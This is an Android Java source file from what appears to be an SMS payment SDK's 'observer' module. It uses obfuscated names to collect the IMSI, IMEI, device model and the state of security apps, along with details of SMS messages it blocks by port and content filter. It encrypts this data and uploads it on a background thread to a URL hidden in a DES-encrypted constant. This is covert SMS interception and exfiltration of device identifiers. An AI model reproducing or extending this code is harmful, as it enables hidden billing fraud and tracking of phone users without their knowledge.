package com.poxiao.smspay.observer.mark;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import com.poxiao.smspay.observer.Debug;
import com.poxiao.smspay.observer.mark.http.HU;
import com.poxiao.smspay.observer.mark.http.KV;
import com.tbu.androidtools.device.DeviceInfo;
import com.tbu.androidtools.util.EncryptionUtil;
import com.tbu.androidtools.util.ReadJsonUtil;

public class OM {

	public static final String POST_MARK_URL = "95bee0b7fa5b1872b8b2773f5f9936ddc29163300181eec402e01afc05e68ffd8bd1ac91f296e90e";

	public final static String NA = "NA";

	public final static int TYPE_REQUEST = 0;
	public final static int TYPE_DELETE = 1;
	public final static int TYPE_REQUEST_RESULT_ADD = 0;
	public final static int TYPE_REQUEST_RESULT_UPDATE = 1;

	public final static int RESULT_SUCCESS = 0;
	public final static int RESULT_ERROR_PERMISSION = 1;
	public final static int RESULT_ERROR_SYS_REFUSE = 2;

	/**
	 * 
	 * 
	 * @param tp
	 *            类型。0，屏蔽请求；1，屏蔽行为
	 * @param r
	 *            屏蔽结果。对于屏蔽行为，0，屏蔽成功。其它，屏蔽失败。对于请求行为，0加入，1更新。
	 * @param pf
	 *            屏蔽端口号
	 * @param p
	 *            匹配到的端口号
	 * @param scf
	 *            屏蔽字符串
	 * @param sc
	 *            实际字符串
	 */
	public static void hUld(MI mi) {
		String si = DeviceInfo.getsi();
		String ei = DeviceInfo.getei();
		String hd_factory = DeviceInfo.getProduct();
		String hd_type = DeviceInfo.getModle();
		int pVersion = DeviceInfo.getSdk();
		String thirdapp = DeviceInfo.getSafeAppState();
		final String info = hCi(mi.tp, mi.r, mi.pf, mi.p, mi.scf, mi.sc, si, ei, hd_factory, hd_type, pVersion,
				thirdapp);
		Debug.i("ObserverMark->uploadData, info:" + info);
		final String strUrl = ReadJsonUtil.decoderByDES(POST_MARK_URL, "p_k");
		Debug.i("ObserverYw ObserverMark uploadData strUrl=" + strUrl);
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					String content = EncryptionUtil.getNewParameter(EncryptionUtil.cbcEncrypt(info,
							EncryptionUtil.KeyString, EncryptionUtil.IvString.getBytes("UTF-8")));
					HU.dP(strUrl, content);
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}).start();

	}

	private static String hCi(int htp, int hr, String hpf, String hp, String hScf, String hs, String hsi, String hmi,
			String hhf, String hht, int hP, String ht) {

		KV keyValue1 = new KV("type", "" + htp);
		KV keyValue2 = new KV("result", "" + hr);
		KV keyValue3 = new KV("port_filter", hpf);
		KV keyValue4 = new KV("port", hp);
		KV keyValue5;
		try {
			keyValue5 = new KV("sendcontent_filter", URLEncoder.encode(hScf, "utf-8"));
		} catch (UnsupportedEncodingException e1) {
			keyValue5 = new KV("sendcontent_filter", hScf);
			e1.printStackTrace();
		}
		KV keyValue6;
		try {
			keyValue6 = new KV("sendcontent", URLEncoder.encode(hs, "utf-8"));
		} catch (UnsupportedEncodingException e) {
			keyValue6 = new KV("sendcontent", hs);
			e.printStackTrace();
		}

		KV keyValue7 = new KV("imsi", hsi);
		KV keyValue8 = new KV("imei", hmi);
		KV keyValue9 = new KV("hd_factory", hhf);
		KV keyValue10 = new KV("hd_type", hht);
		KV keyValue11 = new KV("p_version", "" + hP);
		KV keyValue12 = new KV("thirdapp", ht);

		return HU.dCj(keyValue1, keyValue2, keyValue3, keyValue4, keyValue5, keyValue6, keyValue7, keyValue8, keyValue9,
				keyValue10, keyValue11, keyValue12);
	}
}
